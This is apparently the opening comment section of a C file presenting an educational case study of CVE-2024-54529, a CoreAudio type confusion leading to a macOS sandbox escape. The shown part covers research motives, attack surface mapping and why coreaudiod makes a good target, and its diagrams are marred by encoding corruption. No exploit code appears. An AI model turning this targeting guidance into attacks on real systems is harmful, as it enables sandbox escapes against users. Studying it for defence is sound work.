/*
 * =============================================================================
 * =============================================================================
 *
 *        â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
 *        â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•
 *        â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
 *        â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘
 *         â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
 *          â•šâ•â•â•â•   â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•    â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•
 *
 *     CVE-2024-54529: CoreAudio Type Confusion to Sandbox Escape
 *
 *     A Comprehensive Vulnerability Research Case Study
 *     From First Principles to Full Exploitation
 *
 * =============================================================================
 * =============================================================================
 *
 * DOCUMENT STRUCTURE:
 * -------------------
 *
 *   PART 0: VULNERABILITY RESEARCH FOUNDATIONS
 *           - What is vulnerability research and why it matters
 *           - Attack surface analysis methodology
 *           - Why CoreAudio is an attractive target
 *           - First principles approach to bug hunting
 *           - The defender's perspective
 *
 *   PART 1: HEADER IMPORTS AND CODE ORIGINS
 *           - Complete function origin documentation
 *           - Mach IPC structures and constants
 *           - CoreFoundation APIs for heap manipulation
 *
 *   PART 2: SYSTEM TRACES AND KERNEL INTERNALS
 *           - Kernel-level traces for key functions
 *           - XNU ipc_port/ipc_kmsg structures
 *           - Message dispatch flow
 *
 *   PART 3: EXPLOITATION DETAILS
 *           - Heap grooming mechanism
 *           - Type confusion exploitation
 *           - ROP chain construction
 *           - Binary plist payload encoding
 *
 *   PART 4: ADVANCED TECHNIQUES & REFERENCES
 *           - Zone allocator internals
 *           - Task port exploitation context
 *           - Research references and tools
 *
 *   PART 5: COREAUDIO ARCHITECTURE DEEP DIVE
 *           - Hardware Abstraction Layer (HAL)
 *           - HALS_Object hierarchy and types
 *           - MIG subsystem and message dispatch
 *           - Object lifecycle and management
 *
 *   PART 6: BUG HUNTING METHODOLOGY CASE STUDY
 *           - Knowledge-driven fuzzing approach
 *           - API call chaining technique
 *           - Coverage-guided discovery
 *           - From crash to exploitable bug
 *
 *   PART 7: DEFENSIVE LESSONS AND PATCHING
 *           - Understanding Apple's fix
 *           - Patterns to audit for
 *           - Mitigation strategies
 *           - Building secure IPC services
 *
 * =============================================================================
 * =============================================================================
 * PART 0: VULNERABILITY RESEARCH FOUNDATIONS
 * =============================================================================
 * =============================================================================
 *
 * This section provides the foundational knowledge needed to understand
 * vulnerability research from first principles. Before we dive into the
 * technical details of CVE-2024-54529, we must understand:
 *
 *   1. WHY we search for vulnerabilities
 *   2. HOW we identify targets (attack surface analysis)
 *   3. WHAT makes a good target
 *   4. The METHODOLOGY for systematic bug hunting
 *
 * -----------------------------------------------------------------------------
 * 0.1 THE PURPOSE OF VULNERABILITY RESEARCH
 * -----------------------------------------------------------------------------
 *
 * "The only way to discover the limits of the possible is to go beyond them
 *  into the impossible." - Arthur C. Clarke
 *
 * Vulnerability research exists in a duality:
 *
 *   OFFENSIVE (Red Team):
 *     - Find bugs before adversaries do
 *     - Understand real-world attack capabilities
 *     - Develop detection and response strategies
 *     - Inform threat modeling and risk assessment
 *
 *   DEFENSIVE (Blue Team):
 *     - Identify classes of vulnerabilities to prevent
 *     - Develop secure coding guidelines
 *     - Build automated detection tools
 *     - Prioritize security investments
 *
 * This case study demonstrates BOTH perspectives:
 *   - We show HOW the bug was found (offensive)
 *   - We analyze WHY it existed (defensive)
 *   - We examine the FIX (lessons learned)
 *
 * The goal is to find bugs BEFORE "someone else" does - where "someone else"
 * could be a nation-state actor, ransomware gang, or commercial spyware vendor.
 *
 * Reference: Project Zero's mission statement
 *   https://googleprojectzero.blogspot.com/p/about-project-zero.html
 *
 * -----------------------------------------------------------------------------
 * 0.2 ATTACK SURFACE ANALYSIS: THE STARTING POINT
 * -----------------------------------------------------------------------------
 *
 * Attack surface analysis is the systematic identification and evaluation of
 * all points where an attacker could interact with a system.
 *
 * OWASP defines attack surface as:
 *   "The sum of the different points where an attacker could try to enter
 *    data to or extract data from an environment."
 *
 * For macOS, the primary attack surfaces include:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚                     macOS ATTACK SURFACE MAP                        â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   NETWORK LAYER                                                     â”‚
 *   â”‚   â”œâ”€â”€ TCP/IP stack (XNU BSD layer)                                 â”‚
 *   â”‚   â”œâ”€â”€ Network daemons (mDNSResponder, cupsd, etc.)                 â”‚
 *   â”‚   â”œâ”€â”€ VPN clients and kernel extensions                            â”‚
 *   â”‚   â””â”€â”€ Bluetooth stack                                              â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   APPLICATION LAYER                                                 â”‚
 *   â”‚   â”œâ”€â”€ Browser (Safari, WebKit, JavaScriptCore)                     â”‚
 *   â”‚   â”œâ”€â”€ Mail.app and message parsing                                 â”‚
 *   â”‚   â”œâ”€â”€ Preview.app (PDF, image parsing)                             â”‚
 *   â”‚   â””â”€â”€ Third-party applications                                     â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   IPC LAYER  â—€â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—          â”‚
 *   â”‚   â”œâ”€â”€ Mach IPC (ports, messages)          â•‘ OUR TARGET â•‘          â”‚
 *   â”‚   â”œâ”€â”€ XPC services                        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•          â”‚
 *   â”‚   â”œâ”€â”€ NSXPC (higher-level wrapper)                                 â”‚
 *   â”‚   â”œâ”€â”€ Distributed Objects                                          â”‚
 *   â”‚   â””â”€â”€ Unix sockets and named pipes                                 â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   KERNEL LAYER                                                      â”‚
 *   â”‚   â”œâ”€â”€ System calls (BSD syscalls, Mach traps)                      â”‚
 *   â”‚   â”œâ”€â”€ IOKit drivers                                                â”‚
 *   â”‚   â”œâ”€â”€ Kernel extensions (kexts)                                    â”‚
 *   â”‚   â””â”€â”€ File system handlers                                         â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   HARDWARE LAYER                                                    â”‚
 *   â”‚   â”œâ”€â”€ USB device handling                                          â”‚
 *   â”‚   â”œâ”€â”€ Thunderbolt DMA                                              â”‚
 *   â”‚   â”œâ”€â”€ Audio/Video codecs                                           â”‚
 *   â”‚   â””â”€â”€ Firmware (EFI, T2, etc.)                                     â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * IPC (Inter-Process Communication) is particularly interesting because:
 *
 *   1. PRIVILEGE BOUNDARY CROSSING
 *      - Sandboxed apps can talk to privileged services
 *      - User processes can reach root-owned daemons
 *      - Creates a bridge for sandbox escapes
 *
 *   2. COMPLEX STATE MACHINES
 *      - Services maintain complex internal state
 *      - State confusion leads to vulnerabilities
 *      - Difficult to model all valid state transitions
 *
 *   3. DATA SERIALIZATION
 *      - Complex data formats (plists, XPC dictionaries)
 *      - Parsing is error-prone
 *      - Type confusion opportunities abound
 *
 *   4. LEGACY CODE
 *      - Some services predate modern security practices
 *      - MIG (Mach Interface Generator) from 1980s
 *      - Technical debt accumulates vulnerabilities
 *
 * Reference: OWASP Attack Surface Analysis Cheat Sheet
 *   https://cheatsheetseries.owasp.org/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html
 *
 * -----------------------------------------------------------------------------
 * 0.3 WHY COREAUDIO? TARGET SELECTION CRITERIA
 * -----------------------------------------------------------------------------
 *
 * Not all attack surfaces are equally valuable. When selecting a target for
 * vulnerability research, we consider:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              TARGET SELECTION CRITERIA                              â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   1. REACHABILITY                                                   â”‚
 *   â”‚      â”œâ”€â”€ Can sandboxed apps reach it? ........................ âœ“   â”‚
 *   â”‚      â”œâ”€â”€ Does it require special entitlements? ............... âœ—   â”‚
 *   â”‚      â””â”€â”€ Is it exposed to untrusted input? ................... âœ“   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   2. PRIVILEGE LEVEL                                                â”‚
 *   â”‚      â”œâ”€â”€ What user does it run as? ............... _coreaudiod     â”‚
 *   â”‚      â”œâ”€â”€ Is it sandboxed? ........................ NO (!)          â”‚
 *   â”‚      â””â”€â”€ Special entitlements? ................... Limited          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   3. ATTACK SURFACE SIZE                                            â”‚
 *   â”‚      â”œâ”€â”€ Number of message handlers .............. 72+ handlers    â”‚
 *   â”‚      â”œâ”€â”€ Lines of code ........................... Large            â”‚
 *   â”‚      â””â”€â”€ Data formats processed .................. Plists, MIG     â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   4. COMPLEXITY                                                     â”‚
 *   â”‚      â”œâ”€â”€ Object model complexity ................. High             â”‚
 *   â”‚      â”œâ”€â”€ State machine complexity ................ High             â”‚
 *   â”‚      â””â”€â”€ Inheritance hierarchy ................... Deep             â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   5. HISTORICAL VULNERABILITIES                                     â”‚
 *   â”‚      â”œâ”€â”€ Previous CVEs in this component? ........ Yes              â”‚
 *   â”‚      â””â”€â”€ Similar bugs in related code? ........... Yes              â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * CoreAudio scores HIGH on all criteria:
 *
 *   REACHABILITY: The com.apple.audio.audiohald Mach service is accessible
 *   from sandboxed applications including Safari. Any website could potentially
 *   trigger a vulnerability through JavaScript calling Web Audio APIs.
 *
 *   PRIVILEGE: coreaudiod runs as the special _coreaudiod user and is NOT
 *   sandboxed. Compromising it provides:
 *     - File system access outside sandbox
 *     - Network access
 *     - Ability to spawn processes
 *     - Potential stepping stone to kernel
 *
 *   ATTACK SURFACE: The MIG subsystem exposes 72+ message handlers, each
 *   with its own parsing logic and state transitions.
 *
 *   COMPLEXITY: The HALS_Object hierarchy includes many object types with
 *   complex inheritance relationships - fertile ground for type confusion.
 *
 *   HISTORY: Audio subsystems across operating systems have had numerous
 *   vulnerabilities (Windows Audio Service, PulseAudio, ALSA, etc.).
 *
 * -----------------------------------------------------------------------------
 * 0.4 COREAUDIO IN THE macOS SECURITY MODEL
 * -----------------------------------------------------------------------------
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚                    macOS PROCESS LANDSCAPE                          â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   SANDBOX BOUNDARY                                                  â”‚
 *   â”‚   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                   â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”‚
 *   â”‚   â”‚  Safari     â”‚    â”‚  Mail.app   â”‚    â”‚  Your App   â”‚            â”‚
 *   â”‚   â”‚  (sandboxed)â”‚    â”‚  (sandboxed)â”‚    â”‚  (sandboxed)â”‚            â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜            â”‚
 *   â”‚          â”‚                  â”‚                  â”‚                    â”‚
 *   â”‚   â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•    â”‚
 *   â”‚          â”‚                  â”‚                  â”‚                    â”‚
 *   â”‚          â–¼                  â–¼                  â–¼                    â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
 *   â”‚   â”‚              MACH IPC (bootstrap_look_up)               â”‚      â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
 *   â”‚                              â”‚                                      â”‚
 *   â”‚                              â–¼                                      â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
 *   â”‚   â”‚                      coreaudiod                         â”‚      â”‚
 *   â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚      â”‚
 *   â”‚   â”‚  â”‚  com.apple.audio.audiohald  (MIG Service)        â”‚  â”‚      â”‚
 *   â”‚   â”‚  â”‚                                                   â”‚  â”‚      â”‚
 *   â”‚   â”‚  â”‚  â€¢ 72+ message handlers                          â”‚  â”‚      â”‚
 *   â”‚   â”‚  â”‚  â€¢ HALS_Object heap (our target)                 â”‚  â”‚      â”‚
 *   â”‚   â”‚  â”‚  â€¢ NO SANDBOX PROTECTION                         â”‚  â”‚      â”‚
 *   â”‚   â”‚  â”‚  â€¢ Runs as _coreaudiod user                      â”‚  â”‚      â”‚
 *   â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚      â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
 *   â”‚                              â”‚                                      â”‚
 *   â”‚                              â–¼                                      â”‚
 *   â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
 *   â”‚   â”‚                    XNU KERNEL                           â”‚      â”‚
 *   â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * The key insight: coreaudiod is a BRIDGE from sandboxed processes to the
 * unsandboxed system. Compromising it means escaping the sandbox.
 *
 * Process details (from `ps aux | grep coreaudiod`):
 *
 *   USER          PID  COMMAND
 *   _coreaudiod   xxx  /usr/sbin/coreaudiod
 *
 * The _coreaudiod user is a special system account with limited but still
 * significant privileges - enough to read/write files, make network
 * connections, and potentially escalate further.
 *
 * Reference: "The macOS Process Journey - coreaudiod"
 *   https://medium.com/@boutnaru/the-macos-process-journey-coreaudiod-core-audio-daemon-c17f9044ca22
 *
 * -----------------------------------------------------------------------------
 * 0.5 FIRST PRINCIPLES VULNERABILITY ASSESSMENT (FPVA)
 * -----------------------------------------------------------------------------
 *
 * The First Principles Vulnerability Assessment (FPVA) approach focuses the
 * analyst's attention on the parts of a system most likely to contain
 * vulnerabilities related to high-value assets.
 *
 * For IPC services like coreaudiod, the FPVA approach suggests focusing on:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚           FPVA FOCUS AREAS FOR IPC SERVICES                         â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   1. MESSAGE PARSING                                                â”‚
 *   â”‚      â”œâ”€â”€ How are message sizes validated?                          â”‚
 *   â”‚      â”œâ”€â”€ How are field types verified?                             â”‚
 *   â”‚      â”œâ”€â”€ What happens with malformed input?                        â”‚
 *   â”‚      â””â”€â”€ Are there length/count fields that could overflow?        â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   2. OBJECT LIFECYCLE                                               â”‚
 *   â”‚      â”œâ”€â”€ How are objects created and destroyed?                    â”‚
 *   â”‚      â”œâ”€â”€ What prevents use-after-free?                             â”‚
 *   â”‚      â”œâ”€â”€ Are reference counts properly maintained?                 â”‚
 *   â”‚      â””â”€â”€ Can objects be accessed across sessions?                  â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   3. TYPE SAFETY                                                    â”‚
 *   â”‚      â”œâ”€â”€ How are object types verified?  â—€â•â•â• THE BUG IS HERE      â”‚
 *   â”‚      â”œâ”€â”€ Are casts validated?                                      â”‚
 *   â”‚      â”œâ”€â”€ Do handlers assume specific types?                        â”‚
 *   â”‚      â””â”€â”€ Can type confusion occur?                                 â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   4. STATE TRANSITIONS                                              â”‚
 *   â”‚      â”œâ”€â”€ What states can objects be in?                            â”‚
 *   â”‚      â”œâ”€â”€ Are all transitions valid?                                â”‚
 *   â”‚      â”œâ”€â”€ Can handlers be called out of order?                      â”‚
 *   â”‚      â””â”€â”€ What happens in error paths?                              â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   5. RESOURCE MANAGEMENT                                            â”‚
 *   â”‚      â”œâ”€â”€ Are file handles properly closed?                         â”‚
 *   â”‚      â”œâ”€â”€ Is memory always freed?                                   â”‚
 *   â”‚      â”œâ”€â”€ Can resources be exhausted?                               â”‚
 *   â”‚      â””â”€â”€ Are timeouts properly handled?                            â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * For CVE-2024-54529, the vulnerability lies in TYPE SAFETY:
 *   - Handlers assume fetched objects are of specific types
 *   - No validation occurs before casting
 *   - Providing wrong object type causes type confusion
 *
 * Reference: "First principles vulnerability assessment"
 *   https://www.researchgate.net/publication/215535352_First_principles_vulnerability_assessment
 *
 * -----------------------------------------------------------------------------
 * 0.6 THE VULNERABILITY LANDSCAPE: TYPES OF BUGS
 * -----------------------------------------------------------------------------
 *
 * Understanding vulnerability classes helps focus research efforts:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              VULNERABILITY CLASSIFICATION                           â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   MEMORY CORRUPTION                                                 â”‚
 *   â”‚   â”œâ”€â”€ Buffer Overflow       â”‚ Write past buffer bounds             â”‚
 *   â”‚   â”œâ”€â”€ Use-After-Free        â”‚ Access freed memory                  â”‚
 *   â”‚   â”œâ”€â”€ Double-Free           â”‚ Free same memory twice               â”‚
 *   â”‚   â”œâ”€â”€ Type Confusion â—€â•â•â•â•â•â•â”‚ Wrong type interpretation   [US]    â”‚
 *   â”‚   â”œâ”€â”€ Integer Overflow      â”‚ Arithmetic wrapping                  â”‚
 *   â”‚   â””â”€â”€ Uninitialized Memory  â”‚ Use before initialization            â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   LOGIC ERRORS                                                      â”‚
 *   â”‚   â”œâ”€â”€ Race Conditions       â”‚ TOCTOU, data races                   â”‚
 *   â”‚   â”œâ”€â”€ Authentication Bypass â”‚ Skip auth checks                     â”‚
 *   â”‚   â”œâ”€â”€ Authorization Bypass  â”‚ Access without permission            â”‚
 *   â”‚   â””â”€â”€ State Confusion       â”‚ Invalid state transitions            â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   INFORMATION DISCLOSURE                                            â”‚
 *   â”‚   â”œâ”€â”€ Memory Disclosure     â”‚ Leak kernel/heap addresses           â”‚
 *   â”‚   â”œâ”€â”€ Side Channels         â”‚ Timing, cache attacks                â”‚
 *   â”‚   â””â”€â”€ Error Messages        â”‚ Verbose error information            â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * TYPE CONFUSION (CWE-843) deserves special attention:
 *
 *   Definition: "Access of Resource Using Incompatible Type"
 *
 *   The program allocates or initializes a resource such as a pointer,
 *   object, or variable using one type, but it later accesses that
 *   resource using a type that is incompatible with the original type.
 *
